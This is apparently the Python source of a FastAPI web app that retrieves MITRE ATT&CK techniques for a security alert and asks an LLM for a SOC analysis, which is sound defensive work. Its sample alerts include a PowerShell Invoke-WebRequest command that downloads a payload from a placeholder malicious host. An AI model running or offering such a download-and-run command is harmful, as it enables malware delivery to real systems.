"""
Simple web UI for the MITRE RAG SOC Assistant.
Run with:
    pip install fastapi uvicorn[standard] sentence-transformers faiss-cpu openai python-dotenv requests jinja2 transformers accelerate
    uvicorn web_app:app --reload --host 0.0.0.0 --port 8811
"""

import os
import json
import requests
from pathlib import Path
from typing import List, Dict

import numpy as np
import faiss
from dotenv import load_dotenv
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from openai import OpenAI, AuthenticationError

# Force transformers to skip TensorFlow to avoid float8 import issues
os.environ.setdefault("TRANSFORMERS_NO_TF", "1")
os.environ.setdefault("USE_TF", "0")

from sentence_transformers import SentenceTransformer

# ---------------------------------------------------------------------------
# Config and setup
# ---------------------------------------------------------------------------
load_dotenv()

# Optional local LLM instead of OpenRouter
USE_LOCAL_LLM = os.getenv("USE_LOCAL_LLM", "False").lower() == "true"
LOCAL_MODEL = os.getenv("LOCAL_LLM_MODEL", "Qwen/Qwen2.5-0.5B-Instruct")
local_generator = None

# OpenRouter settings
OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY", "").strip()
BASE_URL = os.getenv("OPENROUTER_BASE", "https://openrouter.ai/api/v1")
MODEL = os.getenv("OPENROUTER_MODEL", "tngtech/deepseek-r1t2-chimera:free")
CLIENT_HEADERS = {
    "HTTP-Referer": os.getenv("OPENROUTER_HTTP_REFERER", "http://localhost"),
    "X-Title": os.getenv("OPENROUTER_APP_TITLE", "MITRE-RAG-Web"),
}

WORKDIR = Path("rag_mitre_openrouter")
WORKDIR.mkdir(exist_ok=True)
MITRE_JSON = WORKDIR / "enterprise-attack.json"

# ---------------------------------------------------------------------------
# Data loading
# ---------------------------------------------------------------------------
def ensure_mitre():
    if MITRE_JSON.exists():
        return
    url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
    resp = requests.get(url, timeout=60)
    resp.raise_for_status()
    MITRE_JSON.write_bytes(resp.content)


def load_documents() -> List[Dict]:
    with MITRE_JSON.open("r", encoding="utf-8") as f:
        mitre = json.load(f)
    docs = []
    for obj in mitre.get("objects", []):
        if obj.get("type") != "attack-pattern":
            continue
        refs = obj.get("external_references", [])
        ext_id = next((r.get("external_id") for r in refs if str(r.get("external_id", "")).startswith("T")), obj.get("id"))
        docs.append(
            {
                "id": ext_id,
                "name": obj.get("name", ""),
                "desc": obj.get("description", ""),
                "det": obj.get("x_mitre_detection", ""),
                "platforms": ", ".join(obj.get("x_mitre_platforms", [])),
                "data_sources": ", ".join(obj.get("x_mitre_data_sources", [])),
                "permissions": ", ".join(obj.get("x_mitre_permissions_required", [])),
            }
        )
    return docs


ensure_mitre()
documents = load_documents()

# ---------------------------------------------------------------------------
# Embeddings + FAISS
# ---------------------------------------------------------------------------
embedder = SentenceTransformer("all-MiniLM-L6-v2")
corpus = []
for d in documents:
    full_text = (
        f"{d['name']}. Description: {d['desc']}. Detection: {d['det']}. "
        f"DataSources: {d['data_sources']}. Platforms: {d['platforms']}. "
        f"PermissionsRequired: {d['permissions']}."
    )
    corpus.append(full_text)

embeddings = embedder.encode(corpus, show_progress_bar=False).astype("float32")
faiss_index = faiss.IndexFlatL2(embeddings.shape[1])
faiss_index.add(embeddings)

# ---------------------------------------------------------------------------
# LLM helpers
# ---------------------------------------------------------------------------
if USE_LOCAL_LLM:
    from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline

    tok = AutoTokenizer.from_pretrained(LOCAL_MODEL)
    mdl = AutoModelForCausalLM.from_pretrained(LOCAL_MODEL, device_map="auto")
    local_generator = pipeline("text-generation", model=mdl, tokenizer=tok, max_new_tokens=300, do_sample=False)


def search_mitre(query: str, top_k: int = 3):
    q_emb = embedder.encode([query]).astype("float32")
    D, I = faiss_index.search(q_emb, top_k)
    out = []
    for i, dist in zip(I[0], D[0]):
        if i < len(documents):
            m = documents[i]
            out.append(
                {
                    "score": float(dist),
                    "id": m["id"],
                    "name": m["name"],
                    "desc": m["desc"],
                    "det": m["det"],
                    "platforms": m["platforms"],
                    "data_sources": m["data_sources"],
                }
            )
    return out


def build_prompt(alert_text: str, mitre_hits):
    context = "\n\n".join(
        f"{m['id']} - {m['name']}\nDescription: {m['desc']}\nDetection guidance: {m['det']}" for m in mitre_hits
    )
    return f"""
You are an expert SOC analyst and incident responder.

Analyze the following security alert using both:
1. the raw alert
2. the MITRE ATT&CK context provided

Your goals:
- explain in detail what the activity means
- identify the likely attacker behavior
- map it to MITRE ATT&CK techniques
- assess the risk and severity
- explain what the attacker may be trying to achieve
- propose detailed, actionable response steps
- include reasoning and detection insights

--- MITRE CONTEXT ---
{context}

--- ALERT ---
{alert_text}

Now produce a detailed SOC analysis, structured into sections:
1. Summary of the activity
2. MITRE Techniques observed
3. What the attacker is likely doing
4. Detailed explanation and reasoning
5. Severity (low/medium/high/critical + justification)
6. Recommended response actions (detailed and concrete)
"""


def call_llm(prompt: str):
    if USE_LOCAL_LLM and local_generator is not None:
        return local_generator(prompt)[0]["generated_text"]
    client = OpenAI(api_key=OPENROUTER_API_KEY, base_url=BASE_URL, default_headers=CLIENT_HEADERS or None)
    resp = client.chat.completions.create(
        model=MODEL,
        messages=[{"role": "user", "content": prompt}],
        temperature=0.1,
        max_tokens=2500,
    )
    return resp.choices[0].message.content


def analyze_alert(alert_text: str, top_k: int = 3):
    mitre_hits = search_mitre(alert_text, top_k)
    prompt = build_prompt(alert_text, mitre_hits)
    try:
        llm_out = call_llm(prompt)
    except AuthenticationError as e:
        if local_generator is not None:
            llm_out = f"[OpenRouter auth failed: {e}. Falling back to local model]\\n" + call_llm(prompt)
        else:
            raise
    return {"alert": alert_text, "mitre_hits": mitre_hits, "analysis": llm_out}


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------
app = FastAPI(title="MITRE RAG SOC Assistant")
templates = Jinja2Templates(directory="templates")


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request, "examples": [
        "Failed password for root from 182.33.54.2 port 55782 ssh2",
        "Process created: powershell Invoke-WebRequest http://malicious/payload.exe",
        "Suricata ET MALWARE Possible Phishing Attempt GET /office365-login.php",
        "User admin logged in from unusual IP 203.0.113.45",
    ]})


@app.post("/analyze")
async def analyze(payload: Dict):
    alert_text = (payload.get("alert") or "").strip()
    top_k = int(payload.get("top_k") or 3)
    if not alert_text:
        return JSONResponse({"error": "Alert text is required"}, status_code=400)
    try:
        res = analyze_alert(alert_text, top_k=top_k)
        return JSONResponse(
            {
                "analysis": res["analysis"],
                "mitre_hits": res["mitre_hits"],
            }
        )
    except AuthenticationError as e:
        return JSONResponse({"error": f"Authentication failed: {e}"}, status_code=401)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)
